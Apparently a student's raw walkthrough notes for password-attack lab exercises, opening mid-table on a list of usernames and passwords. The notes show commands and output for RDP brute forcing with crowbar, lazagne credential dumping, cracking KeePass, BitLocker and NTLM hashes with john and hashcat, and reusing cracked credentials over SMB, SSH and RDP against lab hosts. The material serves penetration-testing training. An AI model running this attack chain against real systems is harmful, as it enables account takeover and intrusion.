|  47 | Karleigh York      | JYU77OSI6XM    |
|  48 | Brennan Nelson     | LUM81UWX3EX    |
|  49 | Quintessa Hughes   | OCE13YLK4YU    |
|  50 | Clinton Pugh       | LYM63FLG3WJ    |
|  51 | Aaron Duncan       | EXI67QKU1DV    |
|  52 | Rebekah Boyle      | TSU58EWW7AV    |
|  53 | Inga Pickett       | LBI88TBG8FG    |
|  54 | Nelle Harmon       | SCS45PQE2SF    |
|  55 | Lee Hendrix        | WCF07LWQ7DI    |
|  56 | Zane Reid          | WHM08PCI6YJ    |
|  57 | Neil Santos        | VFP69WHB8QJ    |
|  58 | Hilda Cameron      | ECP57KJV6GF    |
|  59 | Kasper Franklin    | CUB01RJE1TV    |
|  60 | Lamar Ellison      | ECD63FEI7EC    |
|  61 | Oliver Collier     | UAK54DNB5NU    |
|  62 | Jeanette Stewart   | HCY40SWK4TS    |
|  63 | Dean Hale          | FYX44JDS3FW    |
|  64 | Jasper Walter      | UHE24MXN7UY    |
|  65 | Tasha Nguyen       | LIC48RCT5XL    |
|  66 | Hamilton Lynch     | DBL85UPK4WA    |
|  67 | Mariko Harris      | VSH42HZG2NI    |
|  68 | Caleb Wooten       | RQK77XPZ3UM    |
|  69 | Adele Glenn        | CEH74EIK1HP    |
|  70 | Alvin Lambert      | IYI54DJF1VW    |
|  71 | Barbara Roman      | TYV58TDS0VW    |
|  72 | Naida Arnold       | SLS89ENT3CE    |
|  73 | Rebekah Alexander  | YRR18NTB0SI    |
|  74 | Chava Durham       | CRO01QSG2QS    |
|  75 | Ainsley Pittman    | HYY51CZI5IP    |
|  76 | Danielle Howell    | MGQ65TBI1IH    |
|  77 | Cairo Dale         | QKY37WGY6PK    |
|  78 | Kathleen Fulton    | QWA22ZTE7FK    |
|  79 | Kelsie Mcpherson   | BQP07JMR6HP    |
|  80 | Bevis Herman       | SOR60URB2NJ    |
|  81 | Mufutau Baldwin    | QBB25FTD7HV    |
|  82 | Genevieve Ryan     | KON69QNC5UQ    |
|  83 | Lucius Wall        | JVX56EQT7YI    |
|  84 | Cassidy Gutierrez  | KLZ78QIH6KH    |
|  85 | Aladdin Fisher     | KYS21TWU3GS    |
|  86 | Paul Lancaster     | WDW24NGN8KA    |
|  87 | Jael Roberts       | MML82LOC4FN    |
|  88 | Zena Solomon       | DJN31MHH6UV    |
|  89 | Josephine Garza    | UWZ57ZKM1IV    |
|  90 | Jason Norman       | ISO35HVC2BW    |
|  91 | Rajah Ellison      | TIY46YPJ5TA    |
|  92 | Colt Ferrell       | YCX56EKU9QO    |
|  93 | Brenna Kinney      | FGD21LBQ6IS    |
|  94 | Valentine Mcdowell | XIP27KBN6KL    |
|  95 | Alexander Keith    | CJT35RAJ7DC    |
|  96 | Charles Bell       | FAG53RFK7TH    |
|  97 | Justina Greer      | YPG28SUE4JD    |
|  98 | Elton Wallace      | SGH05RBW1YL    |
|  99 | Jamalia Byers      | KVE47IWE5UF    |
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+

su dennis
7AUgWWQEiMPdqx


get SSH Key id_rsa
P@ssw0rd12020!

ssh -i .ssh/id_rsa root@10.129.202.129 
cat flag.txt


3. Password Attacks Lab - Hard:
Target:10.129.198.99
User: Johanna 
nmap -sV -sC 10.129.202.222
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-19 20:17 GMT
Nmap scan report for 10.129.202.222
Host is up (0.057s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2023-03-19T20:18:43+00:00
|_ssl-date: 2023-03-19T20:18:51+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2023-03-18T20:06:11
|_Not valid after:  2023-09-17T20:06:11
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-19T20:18:45
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.38 seconds

##################################################################################################
3389 RDP Port
sudo apt install -y crowbar
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

crowbar -b rdp -s 10.129.198.99/32 -u johanna -C mut_password.list
2023-03-20 00:27:37 RDP-SUCCESS : 10.129.13.118:3389 - johanna:1231234!


####
xfreerdp /v:10.129.202.222 /u:johanna /p:1231234!


lazagne.exe all -v
[-] johanna not ok for masterkey 0cb12353-ee15-471a-9609-7a804073ba27
[-] johanna not ok for masterkey c5ec0089-9836-4425-ab89-b09c99c86a1c


Documents/Login.kdbx
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


keepass2john Login.kdbx > dbpasshash.txt
john --wordlist=mut_passwort.txt dbpasshash.txt


####
Login.kdbx
Passwort: Qwerty7!


####
david
gRzX7YbeTcDG7


crackmapexec smb 10.129.202.222 -u "david" -p "gRzX7YbeTcDG7" --shares
SMB         10.129.202.222  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.222  445    WINSRV           [+] WINSRV\david:gRzX7YbeTcDG7 
SMB         10.129.202.222  445    WINSRV           [+] Enumerated shares
SMB         10.129.202.222  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.222  445    WINSRV           -----           -----------     ------
SMB         10.129.202.222  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.222  445    WINSRV           C$                              Default share
SMB         10.129.202.222  445    WINSRV           david           READ            
SMB         10.129.202.222  445    WINSRV           IPC$            READ            Remote IPC



smbclient -U david \\\\10.129.202.222\\david
get Backup.vhd


bitlocker2john -i Backup.vhd
$bitlocker$0$16$60d83def3e335699830cc42793dae6e5$1048576$12$80b20a04341fd80103000000$60$ae149c9c17975483390d2afb7ff75c3e3380733976fa7d02bb29caebece6076c3c29096fc341a916c79b0db656a1f28e9f186e8b201c38653f64443a

john --wordlist=mut_passwort.txt backup.hash
123456789!

#####
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::


sudo hashcat -m 1000 'e53d4d912d96874e83429886c7bf22a1' mut_password.list
Administrator
Liverp00l8! 



xfreerdp /v:10.129.131.142 /u:Administrator /p:Liverp00l8!